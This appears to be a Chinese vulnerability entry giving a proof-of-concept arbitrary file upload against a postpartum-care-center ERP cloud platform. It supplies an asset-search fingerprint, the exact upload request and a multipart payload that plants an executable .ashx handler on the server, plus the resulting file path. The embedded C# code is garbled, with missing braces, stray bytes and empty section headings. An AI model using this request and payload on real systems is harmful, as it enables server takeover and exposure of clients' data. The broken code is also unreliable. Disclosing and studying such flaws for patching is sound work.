# 月子会所ERP管理云平台AttachedHandler任意文件上传漏洞

- **系统**：月子会所ERP管理云平台AttachedHandler　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`product="妈妈宝盒-ERP"`
- **请求**：`POST /Page/upload/AttachedHandler.ashx?url=/UploadBaseFolder/ERP&Type=0 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 499`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
public bool IsReusable
get {
return true;
public void ProcessRequest(HttpContext ctx)
ctx.Response.Write("hello");
--00content0boundary00--
�\
上传文件位置
/UploadBaseFolder/ERP/202309250717237350958.ashx
```

**其他**
- 月子会所ERP管理云平台AttachedHandler任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 月子会所ERP管理云平台